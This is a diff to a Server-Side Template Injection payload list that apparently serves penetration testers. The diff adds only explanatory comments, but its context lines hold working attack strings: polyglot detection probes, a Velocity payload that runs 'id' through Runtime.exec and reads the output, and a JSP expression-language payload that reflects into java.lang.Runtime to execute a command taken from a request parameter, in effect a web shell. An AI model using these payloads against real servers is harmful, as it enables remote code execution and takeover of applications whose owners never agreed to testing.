@@ -1,5 +1,6 @@
 # Server-Side Template Injection (SSTI) Payloads
 
+# Math probes below are repeated under each engine on purpose.
 # Detection/Polyglot payloads
 ${{<%[%'"}}%\
 {{7*7}}
@@ -105,6 +106,7 @@ ${{7*7}}
 #set($ex=$rt.getRuntime().exec('id'))##
 $ex.waitFor()
 #set($out=$ex.getInputStream())##
+# Same read-loop line as the Velocity payload above; each block is a full payload.
 #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
 
 # Smarty (PHP)
@@ -292,6 +294,7 @@ ${7*7}
 ${pageContext.request.getSession().setAttribute("shell","".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(request.getParameter("cmd")))}
 
 # Generic testing payloads
+# Jinja-shaped probe, also listed under Jinja2.
 {{self}}
 ${self}
 <%= self %>
